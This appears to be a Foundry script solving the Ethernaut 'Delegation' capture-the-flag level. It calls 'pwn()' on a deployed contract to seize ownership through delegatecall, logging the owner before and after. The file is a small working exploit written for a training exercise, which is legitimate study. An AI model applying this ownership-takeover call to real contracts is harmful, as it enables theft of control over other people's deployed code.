// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation} from "../src/Delegation.sol";

import {Script, console} from "forge-std/script.sol";

contract DelegationSolution is Script {
    Delegation delegation = Delegation(0x4162843eA5EFE8344a84c07011732d771bDdF242);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before : ", delegation.owner());
        address(delegation).call(abi.encodeWithSignature("pwn()"));

        console.log("Owner after : ", delegation.owner());
        vm.stopBroadcast();
    }
}
